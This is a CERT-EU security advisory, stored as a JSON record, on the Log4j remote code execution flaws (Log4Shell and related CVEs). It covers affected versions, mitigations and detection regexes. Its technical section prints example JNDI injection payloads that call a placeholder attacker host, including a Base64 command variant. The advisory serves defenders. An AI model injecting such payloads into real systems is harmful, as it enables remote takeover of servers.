{
  "file_item": {
    "filepath": "security-advisories",
    "filename": "CERT-EU-SA2021-067.pdf"
  },
  "title": "UPDATE: Java Logging Package RCE Vulnerability",
  "serial_number": "2021-067",
  "publish_date": "10-12-2021 11:35:00",
  "description": "On December 9th, information about a critical unauthenticated RCE vulnerability (CVE-2021-44228) that is affecting the well-known Java logging package Log4j used by many popular applications and web services was tweeted along with a proof-of-concept (PoC) posted on GitHub. This vulnerability could allow the attacker a full control of the affected server, if a user-controlled string is logged. Since it is easy to be exploited, the impact of this vulnerability is quite severe. Reports from online users show that this is being actively exploited in the wild!<br>Furthermore, an additional vulnerability was subsequently found (CVE-2021-45046) impacting also certain non-default configurations of version 2.15.0 and below of Log4j library. On December 17th, the severity rating of the CVE-2021-45046 vulnerability has changed from 3.7 to 9 out of 10. Initially described as a Denial-of-Service (DoS), the vulnerability impact assessment has changed and could lead to Remote Code Execution under certain conditions.<br>A third vulnerability (CVE-2021-45105) has been found on December 17th impacting also certain non-default configurations of version 2.16 and below of the Log4j library. This vulnerability, with a severity score of 7.5 out of 10, could lead to additional DoS conditions.<br>Another vulnerability (CVE-2021-4104), with a severity score 8.1 out of 10, has been discovered on December 14th affecting a non-default configuration of the version 1.2 of the Log4j library. This vulnerability could lead to remote code execution.<br>On December 16th, security researchers documented also a new attack vector, using WebSockets, that expends the attack surface for these vulnerabilities. Anyone running a vulnerable version of Log4j library on its machine or in the local network could browse a website and potentially trigger the vulnerability. This includes services running Log4j and listening only on \"localhost\" port.<br>On December 28th, new fixes have been released to address the vulnerability \"CVE-2021-44832\" with a severity score 6.6 out of 10. This vulnerability could allow an attacker, with control over the configuration file, to achieve remote code execution on the server.<br>Finally, recently, on January 18th 2022, Apache released information about vulnerabilities affecting \"log4j\" library version 1. Since Log4j 1 is no longer maintained none of the issues will be fixed.",
  "url_title": "2021-067",
  "content_markdown": "---\ntitle: 'Java Logging Package RCE Vulnerability'\nversion: '1.10'\nnumber: '2021-067'\ndate: 'January 29, 2022'\n---\n\n_History:_\n\n* _10/12/2021 --- v1.0 -- Initial publication_\n* _10/12/2021 --- v1.1 -- Improved detection section_\n* _13/12/2021 --- v1.2 -- Update affected products section and the recommendations_\n* _14/12/2021 --- v1.3 -- Update recommendation section as well as technical details_\n* _15/12/2021 --- v1.4 -- Update recommendation section as well as technical details_\n* _17/12/2021 --- v1.5 -- Add information about CVE-2021-45046_\n* _17/12/2021 --- v1.6 -- Update mitigation section_\n* _18/12/2021 --- v1.7 -- Add information about new CVEs and the new attack surface_\n* _23/12/2021 --- v1.8 -- Update affected versions_\n* _30/12/2021 --- v1.9 -- Add information about CVE-2021-44832_\n* _29/01/2022 --- v1.10 -- Add log4j 1.x vulnerabilities_\n\n# Summary\n\nOn December 9th, information about a critical unauthenticated RCE vulnerability (**CVE-2021-44228**) that is affecting the well-known Java logging package **Log4j** used by many popular applications and web services [9, 10] was tweeted [1] along with a proof-of-concept (PoC) posted on GitHub [2]. This vulnerability could allow the attacker a full control of the affected server, if a user-controlled string is logged. Since it is easy to be exploited, the impact of this vulnerability is quite severe [3]. **Reports from online users show that this is being actively exploited in the wild!**\n\nFurthermore, an additional vulnerability was subsequently found (**CVE-2021-45046**) impacting also certain non-default configurations of version 2.15.0 and below of Log4j library. On December 17th, the severity rating of the **CVE-2021-45046** vulnerability has changed from 3.7 to 9 out of 10 [13]. Initially described as a Denial-of-Service (DoS), the vulnerability impact assessment has changed and could lead to Remote Code Execution under certain conditions.\n\nA third vulnerability (**CVE-2021-45105**) has been found on December 17th impacting also certain non-default configurations of version 2.16 and below of the Log4j library. This vulnerability, with a severity score of 7.5 out of 10, could lead to additional DoS conditions [13].\n\nAnother vulnerability (**CVE-2021-4104**), with a severity score 8.1 out of 10, has been discovered on December 14th [14] affecting a non-default configuration of the version 1.2 of the Log4j library. This vulnerability could lead to remote code execution.\n\nOn December 16th, security researchers documented also a new attack vector, using WebSockets, that expends the attack surface for these vulnerabilities [15]. Anyone running a vulnerable version of Log4j library on its machine or in the local network could browse a website and potentially trigger the vulnerability. This includes services running Log4j and listening only on `localhost` port.\n\nOn December 28th, new fixes have been released to address the vulnerability `CVE-2021-44832` with a severity score 6.6 out of 10 [13]. This vulnerability could allow an attacker, **with control over the configuration file**, to achieve remote code execution on the server.\n\nFinally, recently, on January 18th 2022, Apache released information about vulnerabilities affecting `log4j` library version 1 [16]. Since Log4j 1 is no longer maintained none of the issues will be fixed.\n\n# Technical Details\n\n## CVE-2021-44228\n\nWhen the server logs the data containing the malicious payload (e.g., `${jndi:ldap://attacker[.]com/a}`) in the request (sent by a user via any protocol), the Log4j vulnerability is triggered by this payload and the server makes a request to `attacker.com` via Java Naming and Directory Interface (JNDI).\n\nThis response contains a path to a remote Java class file^[e.g., `http://second-stage.attacker[.]com/Exploit.class`], which is injected into the server process. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code [3].\n\nAttackers might also deliver additional malware by leveraging the RCE with a persistent `.jar` file running and listening for incoming special crafted requests^[e.g.,  `${jndi:ldap://attacker[.]com/Basic/Command/Base64/<Base64_encoded_command>}` [12]]. Those requests would trigger the expected functionality that the malicious `.jar` file, which is already running, may offer.\n\n## CVE-2021-45046\n\nIn certain non-default configurations, the patch introduced in Apache Log4j 2.15.0 is incomplete. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, `$${ctx:loginId}`), attackers with control over Thread Context Map (MDC) input data can craft malicious input data using a JNDI lookup pattern, resulting in an information leak and remote code execution in some environments, and local code execution in all environments [13].\n\nRemote code execution has been demonstrated on macOS, but no other tested environments yet.\n\n## CVE-2021-45105\n\nIn certain non-default configurations, Apache Log4j2 does not protect from uncontrolled recursion from self-referential lookups. An attacker with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process, and thus, create denial-of-service conditions [13].\n\n## CVE-2021-44832\n\nIf attackers obtain write access to the Log4j configuration, they can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code.\n\n## CVE-2021-4104\n\nIf attackers obtain write access to the Log4j configuration, they can provide `TopicBindingName` and `TopicConnectionFactoryBindingName` configurations causing JMSAppender to perform JNDI requests that result in remote code execution in a similar fashion to `CVE-2021-44228` [14]. This issue only affects Log4j 1.2 when specifically configured to use JMSAppender, which is not the default. Apache Log4j 1.2 reached end-of-life in August 2015 and **will not be patched**.\n\n## CVE-2022-23302\n\nThis vulnerability is affecting JMSSink which is present in all versions of Log4j 1.x. This component is vulnerable to deserialisation of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing JMSSink to perform JNDI requests that result in remote code execution in a similar fashion to `CVE-2021-4104`. Note this issue only affects Log4j 1.x when specifically configured to use JMSSink, which is **not the default**.\n\n## CVE-2022-23305\n\nBy design, the JDBCAppender in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from PatternLayout. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed. Note this issue only affects Log4j 1.x when specifically configured to use the JDBCAppender, which is **not the default**.\n\n## CVE-2022-23307\n\n`CVE-2022-23307` is a **critical severity** (severity score 10 out of 10) against the chainsaw component in Log4j 1.x. This is the same issue corrected in `CVE-2020-9493` [17] fixed in Chainsaw 2.1.0 but Chainsaw was included as part of Log4j 1.2.x.\n\n# Affected Products\n\n**CVE-2021-44228** vulnerability affects systems and services that use the Java logging library, Apache Log4j between versions `2.0-beta9` and `2.14.1` are affected by this vulnerability.\n\n**CVE-2021-45046** vulnerability affects systems and services that use the Java logging library, for Apache Log4j versions from `2.0-beta9` to `2.15.0`, excluding `2.12.2`(Java 7).\n\n**CVE-2021-45105** vulnerability affects systems and services that use the Java logging library, for Apache Log4j versions from `2.0-beta9` to `2.16.0`, excluding `2.3.1` (Java 6) and `2.12.3` (Java 7).\n\n**CVE-2021-44832** vulnerability affects systems and services that use the Java logging library, for Apache Log4j versions from `2.0-alpha7` to `2.17.0`, excluding `2.3.2` (Java 6) and `2.12.4` (Java 7).\n\n**CVE-2021-4104** vulnerability affects systems and services that use the Java logging library, for Apache Log4j version `1.2`.\n\n**CVE-2022-23302** vulnerability affects systems and services that use the Java logging library, for Apache Log4j versions `1.x`.\n\n**CVE-2022-23305** vulnerability affects systems and services that use the Java logging library, for Apache Log4j version `1.2`.\n\n**CVE-2022-23307** vulnerability affects systems and services that use the Java logging library, for Apache Log4j version `1.2`.\n\nThe scope includes many applications and services written in Java.\n\nWhile the version 1.x of Apache Log4j is not vulnerable in its **default configuration**^[The vulnerability only exists if JNDI is enabled in the JMS Appender component, or if JMSSink component is enabled, or if JDBCAppender component is enabled.] to `CVE-2021-44228`, `CVE-2021-45046`, `CVE-2021-45105`, `CVE-2021-44832`, `CVE-2022-23302`, and `CVE-2022-23305`, it is no longer maintained and is exposed to other vulnerabilities (such as `CVE-2021-4104`, `CVE-2022-23302`, `CVE-2022-23305`, and `CVE-2022-23307`). Thus, it is not recommended to use this version.\n\nTrusted peers try to maintain a list of all products, services and components that use the vulnerable library as well as their patch availability status [9].\n\n# Recommendations\n\nCERT-EU strongly recommends to check all servers for the use of the vulnerable `Log4j` library.\n\nCERT-EU also strongly recommends to upgrade Log4j library to `Log4j-2.17.1` [4] or later. Please keep in mind that this version requires Java 8 or later. When the upgrade is not possible, it is recommended to apply mitigations. It is strongly discourage to use the version 1 of the `log4j` library.\n\nIt is advised to use an up-to-date version of Java as it brings restrictions to JDNI calls based on `LDAP` and `RMI`. However, while these restrictions make exploitation more difficult, it is still possible to bypass these restrictions, so the upgrade to unaffected version of `Log4j` library is still required.\n\nIf an Internet facing vulnerable application is found, it is strongly recommended to:\n\n- isolate the resource from the rest of the internal network;\n- analyse the machine against any persistent compromise.\n\n## Scanning\n\nAs the `Log4j` library is used by numerous products, the complete scope could be very difficult to define. To help analysts, trusted peers are maintaining a list of tools and scripts that aim at detecting the use of `Log4j` library [10] via external scans, but also directly on the servers. Some of the listed tools also provide mitigation capabilities.\n\n## Mitigations\n\nIn the previous advisories, it was mentioned to start Java applications with `Log4j2.formatMsgNoLookups` option set to _True_ or to modify pattern layout to `%m{nolookups}` instead of `%m`. This mitigation is no longer considered as safe and **should not by applied anymore** [13] (See _Older (discredited) mitigation measures_ section of the reference).\n\n### Remove the Vulnerable JNDI Class\n\nAnother way to mitigate the vulnerability is to remove the affected `JndiLookup` class from the JAR package, as in most environments JNDI lookup feature will not be used. However, this might impact applications and prevent it from running correctly.\n\nTo do so, you will need to:\n\n- shutdown running JVM process;\n- backup the original JAR archive;\n- create the same JAR archive and remove the `org/apache/logging/Log4j/core/lookup/JndiLookup.class` entry;\n- restart JVM.\n\n### Use Web Application Firewall (WAF) and Intrusion Detection System (IDS)\n\nIDS and Web Application Firewall (WAF) signatures are also available to detect and block most of exploitation attempts [8].\n\nTrusted partners maintain a list of intelligence sources that contains IDS and WAF rules that might be used in order to mitigate risks [11].\n\n_Please note that some attackers are able to **bypass such detection rules** by obfuscating the payload._\n\n### Other Mitigations\n\nCERT-EU also recommends preventing servers from performing outgoing network requests when not needed (or at least whitelist remote endpoints).\n\n## Detection\n\n### Reverse proxy, WAF and web-server logs\n\nIn order to identify exploit attempts, one could look the entries matching the following regex (using `egrep` or `Powershell` for example) [11]:\n\n```\n\\${(\\${(.*?:|.*?:.*?:-)('|\"|`)*(?1)}*|[jndi:lapsrm]('|\"|`)*}*){9,11}\n```\n\nSome attackers successfully obfuscate the payloads to evade such detection, though [6]. Thus, the commands above might not detect the most advanced exploitation attempts.\n\n### Application Logs\n\nA presence of the following signatures in the logs is a sign of likely compromise of the application [11]:\n\n```\ncom.sun.jndi.\ncom.sun.jndi.dns.DnsContext\ncom.sun.jndi.ldap.LdapCtx\nError looking up JNDI resource\n```\n\nAnalyst might want to look in the application logs for the presence of these strings.\n\n### Yara Rules\n\nYara rules are available to scan for the presence of the vulnerable library, but also for potentially compromised machines [8, 18].\n\n### Indicators of Compromise\n\nTrusted peers maintain a list of sources that publish Indicators of Compromise that could help analysts identifying vulnerable or compromised assets [7].\n\n# References\n\n[1] <https://twitter.com/P0rZ9/status/1468949890571337731>\n\n[2] <https://github.com/tangxiaofeng7/apache-Log4j-poc>\n\n[3] <https://www.lunasec.io/docs/blog/Log4j-zero-day>\n\n[4] <https://repo1.maven.org/maven2/org/apache/logging/Log4j/Log4j-core/2.17.0/>\n\n[5] <https://github.com/apache/logging-Log4j2/pull/608#issuecomment-990494126>\n\n[6] <https://twitter.com/entropyqueen_/status/1469961345848299520?s=21>\n\n[7] <https://github.com/NCSC-NL/log4shell/tree/main/iocs>\n\n[8] <https://twitter.com/ET_Labs/status/1469339963871354884>\n\n[9] <https://github.com/NCSC-NL/log4shell/tree/main/software>\n\n[10] <https://github.com/NCSC-NL/log4shell/tree/main/scanning>\n\n[11] <https://github.com/NCSC-NL/log4shell/tree/main/mitigation>\n\n[12] <https://blog.talosintelligence.com/2021/12/apache-Log4j-rce-vulnerability.html>\n\n[13] <https://logging.apache.org/Log4j/2.x/security.html>\n\n[14] <https://nvd.nist.gov/vuln/detail/CVE-2021-4104>\n\n[15] <https://www.blumira.com/analysis-log4shell-local-trigger/>\n\n[16] <https://logging.apache.org/log4j/1.2/>\n\n[17] <https://lists.apache.org/thread/rx0hpjow5csq05r93cyvntj9ry19tm9y>\n",
  "content_html": "<p><em>History:</em></p><ul><li><em>10/12/2021 --- v1.0 -- Initial publication</em></li><li><em>10/12/2021 --- v1.1 -- Improved detection section</em></li><li><em>13/12/2021 --- v1.2 -- Update affected products section and the recommendations</em></li><li><em>14/12/2021 --- v1.3 -- Update recommendation section as well as technical details</em></li><li><em>15/12/2021 --- v1.4 -- Update recommendation section as well as technical details</em></li><li><em>17/12/2021 --- v1.5 -- Add information about CVE-2021-45046</em></li><li><em>17/12/2021 --- v1.6 -- Update mitigation section</em></li><li><em>18/12/2021 --- v1.7 -- Add information about new CVEs and the new attack surface</em></li><li><em>23/12/2021 --- v1.8 -- Update affected versions</em></li><li><em>30/12/2021 --- v1.9 -- Add information about CVE-2021-44832</em></li><li><em>29/01/2022 --- v1.10 -- Add log4j 1.x vulnerabilities</em></li></ul><h2 id=\"summary\">Summary</h2><p>On December 9th, information about a critical unauthenticated RCE vulnerability (<strong>CVE-2021-44228</strong>) that is affecting the well-known Java logging package <strong>Log4j</strong> used by many popular applications and web services [9, 10] was tweeted [1] along with a proof-of-concept (PoC) posted on GitHub [2]. This vulnerability could allow the attacker a full control of the affected server, if a user-controlled string is logged. Since it is easy to be exploited, the impact of this vulnerability is quite severe [3]. <strong>Reports from online users show that this is being actively exploited in the wild!</strong></p><p>Furthermore, an additional vulnerability was subsequently found (<strong>CVE-2021-45046</strong>) impacting also certain non-default configurations of version 2.15.0 and below of Log4j library. On December 17th, the severity rating of the <strong>CVE-2021-45046</strong> vulnerability has changed from 3.7 to 9 out of 10 [13]. Initially described as a Denial-of-Service (DoS), the vulnerability impact assessment has changed and could lead to Remote Code Execution under certain conditions.</p><p>A third vulnerability (<strong>CVE-2021-45105</strong>) has been found on December 17th impacting also certain non-default configurations of version 2.16 and below of the Log4j library. This vulnerability, with a severity score of 7.5 out of 10, could lead to additional DoS conditions [13].</p><p>Another vulnerability (<strong>CVE-2021-4104</strong>), with a severity score 8.1 out of 10, has been discovered on December 14th [14] affecting a non-default configuration of the version 1.2 of the Log4j library. This vulnerability could lead to remote code execution.</p><p>On December 16th, security researchers documented also a new attack vector, using WebSockets, that expends the attack surface for these vulnerabilities [15]. Anyone running a vulnerable version of Log4j library on its machine or in the local network could browse a website and potentially trigger the vulnerability. This includes services running Log4j and listening only on <code>localhost</code> port.</p><p>On December 28th, new fixes have been released to address the vulnerability <code>CVE-2021-44832</code> with a severity score 6.6 out of 10 [13]. This vulnerability could allow an attacker, <strong>with control over the configuration file</strong>, to achieve remote code execution on the server.</p><p>Finally, recently, on January 18th 2022, Apache released information about vulnerabilities affecting <code>log4j</code> library version 1 [16]. Since Log4j 1 is no longer maintained none of the issues will be fixed.</p><h2 id=\"technical-details\">Technical Details</h2><h3 id=\"cve-2021-44228\">CVE-2021-44228</h3><p>When the server logs the data containing the malicious payload (e.g., <code>${jndi:ldap://attacker[.]com/a}</code>) in the request (sent by a user via any protocol), the Log4j vulnerability is triggered by this payload and the server makes a request to <code>attacker.com</code> via Java Naming and Directory Interface (JNDI).</p><p>This response contains a path to a remote Java class file^[e.g., <code>http://second-stage.attacker[.]com/Exploit.class</code>], which is injected into the server process. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code [3].</p><p>Attackers might also deliver additional malware by leveraging the RCE with a persistent <code>.jar</code> file running and listening for incoming special crafted requests^[e.g., <code>${jndi:ldap://attacker[.]com/Basic/Command/Base64/&lt;Base64_encoded_command&gt;}</code> [12]]. Those requests would trigger the expected functionality that the malicious <code>.jar</code> file, which is already running, may offer.</p><h3 id=\"cve-2021-45046\">CVE-2021-45046</h3><p>In certain non-default configurations, the patch introduced in Apache Log4j 2.15.0 is incomplete. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, <code>$${ctx:loginId}</code>), attackers with control over Thread Context Map (MDC) input data can craft malicious input data using a JNDI lookup pattern, resulting in an information leak and remote code execution in some environments, and local code execution in all environments [13].</p><p>Remote code execution has been demonstrated on macOS, but no other tested environments yet.</p><h3 id=\"cve-2021-45105\">CVE-2021-45105</h3><p>In certain non-default configurations, Apache Log4j2 does not protect from uncontrolled recursion from self-referential lookups. An attacker with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process, and thus, create denial-of-service conditions [13].</p><h3 id=\"cve-2021-44832\">CVE-2021-44832</h3><p>If attackers obtain write access to the Log4j configuration, they can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code.</p><h3 id=\"cve-2021-4104\">CVE-2021-4104</h3><p>If attackers obtain write access to the Log4j configuration, they can provide <code>TopicBindingName</code> and <code>TopicConnectionFactoryBindingName</code> configurations causing JMSAppender to perform JNDI requests that result in remote code execution in a similar fashion to <code>CVE-2021-44228</code> [14]. This issue only affects Log4j 1.2 when specifically configured to use JMSAppender, which is not the default. Apache Log4j 1.2 reached end-of-life in August 2015 and <strong>will not be patched</strong>.</p><h3 id=\"cve-2022-23302\">CVE-2022-23302</h3><p>This vulnerability is affecting JMSSink which is present in all versions of Log4j 1.x. This component is vulnerable to deserialisation of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a <code>TopicConnectionFactoryBindingName</code> configuration causing JMSSink to perform JNDI requests that result in remote code execution in a similar fashion to <code>CVE-2021-4104</code>. Note this issue only affects Log4j 1.x when specifically configured to use JMSSink, which is <strong>not the default</strong>.</p><h3 id=\"cve-2022-23305\">CVE-2022-23305</h3><p>By design, the JDBCAppender in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from PatternLayout. The message converter, <code>%m</code>, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed. Note this issue only affects Log4j 1.x when specifically configured to use the JDBCAppender, which is <strong>not the default</strong>.</p><h3 id=\"cve-2022-23307\">CVE-2022-23307</h3><p><code>CVE-2022-23307</code> is a <strong>critical severity</strong> (severity score 10 out of 10) against the chainsaw component in Log4j 1.x. This is the same issue corrected in <code>CVE-2020-9493</code> [17] fixed in Chainsaw 2.1.0 but Chainsaw was included as part of Log4j 1.2.x.</p><h2 id=\"affected-products\">Affected Products</h2><p><strong>CVE-2021-44228</strong> vulnerability affects systems and services that use the Java logging library, Apache Log4j between versions <code>2.0-beta9</code> and <code>2.14.1</code> are affected by this vulnerability.</p><p><strong>CVE-2021-45046</strong> vulnerability affects systems and services that use the Java logging library, for Apache Log4j versions from <code>2.0-beta9</code> to <code>2.15.0</code>, excluding <code>2.12.2</code>(Java 7).</p><p><strong>CVE-2021-45105</strong> vulnerability affects systems and services that use the Java logging library, for Apache Log4j versions from <code>2.0-beta9</code> to <code>2.16.0</code>, excluding <code>2.3.1</code> (Java 6) and <code>2.12.3</code> (Java 7).</p><p><strong>CVE-2021-44832</strong> vulnerability affects systems and services that use the Java logging library, for Apache Log4j versions from <code>2.0-alpha7</code> to <code>2.17.0</code>, excluding <code>2.3.2</code> (Java 6) and <code>2.12.4</code> (Java 7).</p><p><strong>CVE-2021-4104</strong> vulnerability affects systems and services that use the Java logging library, for Apache Log4j version <code>1.2</code>.</p><p><strong>CVE-2022-23302</strong> vulnerability affects systems and services that use the Java logging library, for Apache Log4j versions <code>1.x</code>.</p><p><strong>CVE-2022-23305</strong> vulnerability affects systems and services that use the Java logging library, for Apache Log4j version <code>1.2</code>.</p><p><strong>CVE-2022-23307</strong> vulnerability affects systems and services that use the Java logging library, for Apache Log4j version <code>1.2</code>.</p><p>The scope includes many applications and services written in Java.</p><p>While the version 1.x of Apache Log4j is not vulnerable in its <strong>default configuration</strong>^[The vulnerability only exists if JNDI is enabled in the JMS Appender component, or if JMSSink component is enabled, or if JDBCAppender component is enabled.] to <code>CVE-2021-44228</code>, <code>CVE-2021-45046</code>, <code>CVE-2021-45105</code>, <code>CVE-2021-44832</code>, <code>CVE-2022-23302</code>, and <code>CVE-2022-23305</code>, it is no longer maintained and is exposed to other vulnerabilities (such as <code>CVE-2021-4104</code>, <code>CVE-2022-23302</code>, <code>CVE-2022-23305</code>, and <code>CVE-2022-23307</code>). Thus, it is not recommended to use this version.</p><p>Trusted peers try to maintain a list of all products, services and components that use the vulnerable library as well as their patch availability status [9].</p><h2 id=\"recommendations\">Recommendations</h2><p>CERT-EU strongly recommends to check all servers for the use of the vulnerable <code>Log4j</code> library.</p><p>CERT-EU also strongly recommends to upgrade Log4j library to <code>Log4j-2.17.1</code> [4] or later. Please keep in mind that this version requires Java 8 or later. When the upgrade is not possible, it is recommended to apply mitigations. It is strongly discourage to use the version 1 of the <code>log4j</code> library.</p><p>It is advised to use an up-to-date version of Java as it brings restrictions to JDNI calls based on <code>LDAP</code> and <code>RMI</code>. However, while these restrictions make exploitation more difficult, it is still possible to bypass these restrictions, so the upgrade to unaffected version of <code>Log4j</code> library is still required.</p><p>If an Internet facing vulnerable application is found, it is strongly recommended to:</p><ul><li>isolate the resource from the rest of the internal network;</li><li>analyse the machine against any persistent compromise.</li></ul><h3 id=\"scanning\">Scanning</h3><p>As the <code>Log4j</code> library is used by numerous products, the complete scope could be very difficult to define. To help analysts, trusted peers are maintaining a list of tools and scripts that aim at detecting the use of <code>Log4j</code> library [10] via external scans, but also directly on the servers. Some of the listed tools also provide mitigation capabilities.</p><h3 id=\"mitigations\">Mitigations</h3><p>In the previous advisories, it was mentioned to start Java applications with <code>Log4j2.formatMsgNoLookups</code> option set to <em>True</em> or to modify pattern layout to <code>%m{nolookups}</code> instead of <code>%m</code>. This mitigation is no longer considered as safe and <strong>should not by applied anymore</strong> [13] (See <em>Older (discredited) mitigation measures</em> section of the reference).</p><h4 id=\"remove-the-vulnerable-jndi-class\">Remove the Vulnerable JNDI Class</h4><p>Another way to mitigate the vulnerability is to remove the affected <code>JndiLookup</code> class from the JAR package, as in most environments JNDI lookup feature will not be used. However, this might impact applications and prevent it from running correctly.</p><p>To do so, you will need to:</p><ul><li>shutdown running JVM process;</li><li>backup the original JAR archive;</li><li>create the same JAR archive and remove the <code>org/apache/logging/Log4j/core/lookup/JndiLookup.class</code> entry;</li><li>restart JVM.</li></ul><h4 id=\"use-web-application-firewall-waf-and-intrusion-detection-system-ids\">Use Web Application Firewall (WAF) and Intrusion Detection System (IDS)</h4><p>IDS and Web Application Firewall (WAF) signatures are also available to detect and block most of exploitation attempts [8].</p><p>Trusted partners maintain a list of intelligence sources that contains IDS and WAF rules that might be used in order to mitigate risks [11].</p><p><em>Please note that some attackers are able to <strong>bypass such detection rules</strong> by obfuscating the payload.</em></p><h4 id=\"other-mitigations\">Other Mitigations</h4><p>CERT-EU also recommends preventing servers from performing outgoing network requests when not needed (or at least whitelist remote endpoints).</p><h3 id=\"detection\">Detection</h3><h4 id=\"reverse-proxy-waf-and-web-server-logs\">Reverse proxy, WAF and web-server logs</h4><p>In order to identify exploit attempts, one could look the entries matching the following regex (using <code>egrep</code> or <code>Powershell</code> for example) [11]:</p><pre><code>\\${(\\${(.*?:|.*?:.*?:-)('|\"|`)*(?1)}*|[jndi:lapsrm]('|\"|`)*}*){9,11}\n</code></pre><p>Some attackers successfully obfuscate the payloads to evade such detection, though [6]. Thus, the commands above might not detect the most advanced exploitation attempts.</p><h4 id=\"application-logs\">Application Logs</h4><p>A presence of the following signatures in the logs is a sign of likely compromise of the application [11]:</p><pre><code>com.sun.jndi.\ncom.sun.jndi.dns.DnsContext\ncom.sun.jndi.ldap.LdapCtx\nError looking up JNDI resource\n</code></pre><p>Analyst might want to look in the application logs for the presence of these strings.</p><h4 id=\"yara-rules\">Yara Rules</h4><p>Yara rules are available to scan for the presence of the vulnerable library, but also for potentially compromised machines [8, 18].</p><h4 id=\"indicators-of-compromise\">Indicators of Compromise</h4><p>Trusted peers maintain a list of sources that publish Indicators of Compromise that could help analysts identifying vulnerable or compromised assets [7].</p><h2 id=\"references\">References</h2><p>[1] <a rel=\"noopener\" target=\"_blank\" href=\"https://twitter.com/P0rZ9/status/1468949890571337731\">https://twitter.com/P0rZ9/status/1468949890571337731</a></p><p>[2] <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/tangxiaofeng7/apache-Log4j-poc\">https://github.com/tangxiaofeng7/apache-Log4j-poc</a></p><p>[3] <a rel=\"noopener\" target=\"_blank\" href=\"https://www.lunasec.io/docs/blog/Log4j-zero-day\">https://www.lunasec.io/docs/blog/Log4j-zero-day</a></p><p>[4] <a rel=\"noopener\" target=\"_blank\" href=\"https://repo1.maven.org/maven2/org/apache/logging/Log4j/Log4j-core/2.17.0/\">https://repo1.maven.org/maven2/org/apache/logging/Log4j/Log4j-core/2.17.0/</a></p><p>[5] <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/apache/logging-Log4j2/pull/608#issuecomment-990494126\">https://github.com/apache/logging-Log4j2/pull/608#issuecomment-990494126</a></p><p>[6] <a rel=\"noopener\" target=\"_blank\" href=\"https://twitter.com/entropyqueen_/status/1469961345848299520?s=21\">https://twitter.com/entropyqueen_/status/1469961345848299520?s=21</a></p><p>[7] <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/NCSC-NL/log4shell/tree/main/iocs\">https://github.com/NCSC-NL/log4shell/tree/main/iocs</a></p><p>[8] <a rel=\"noopener\" target=\"_blank\" href=\"https://twitter.com/ET_Labs/status/1469339963871354884\">https://twitter.com/ET_Labs/status/1469339963871354884</a></p><p>[9] <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/NCSC-NL/log4shell/tree/main/software\">https://github.com/NCSC-NL/log4shell/tree/main/software</a></p><p>[10] <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/NCSC-NL/log4shell/tree/main/scanning\">https://github.com/NCSC-NL/log4shell/tree/main/scanning</a></p><p>[11] <a rel=\"noopener\" target=\"_blank\" href=\"https://github.com/NCSC-NL/log4shell/tree/main/mitigation\">https://github.com/NCSC-NL/log4shell/tree/main/mitigation</a></p><p>[12] <a rel=\"noopener\" target=\"_blank\" href=\"https://blog.talosintelligence.com/2021/12/apache-Log4j-rce-vulnerability.html\">https://blog.talosintelligence.com/2021/12/apache-Log4j-rce-vulnerability.html</a></p><p>[13] <a rel=\"noopener\" target=\"_blank\" href=\"https://logging.apache.org/Log4j/2.x/security.html\">https://logging.apache.org/Log4j/2.x/security.html</a></p><p>[14] <a rel=\"noopener\" target=\"_blank\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-4104\">https://nvd.nist.gov/vuln/detail/CVE-2021-4104</a></p><p>[15] <a rel=\"noopener\" target=\"_blank\" href=\"https://www.blumira.com/analysis-log4shell-local-trigger/\">https://www.blumira.com/analysis-log4shell-local-trigger/</a></p><p>[16] <a rel=\"noopener\" target=\"_blank\" href=\"https://logging.apache.org/log4j/1.2/\">https://logging.apache.org/log4j/1.2/</a></p><p>[17] <a rel=\"noopener\" target=\"_blank\" href=\"https://lists.apache.org/thread/rx0hpjow5csq05r93cyvntj9ry19tm9y\">https://lists.apache.org/thread/rx0hpjow5csq05r93cyvntj9ry19tm9y</a></p>",
  "licence": {
    "title": "Creative Commons Attribution 4.0 International (CC-BY 4.0)",
    "link": "https://creativecommons.org/licenses/by/4.0/",
    "restrictions": "https://cert.europa.eu/legal-notice",
    "author": "The Cybersecurity Service for the Union institutions, bodies, offices and agencies"
  }
}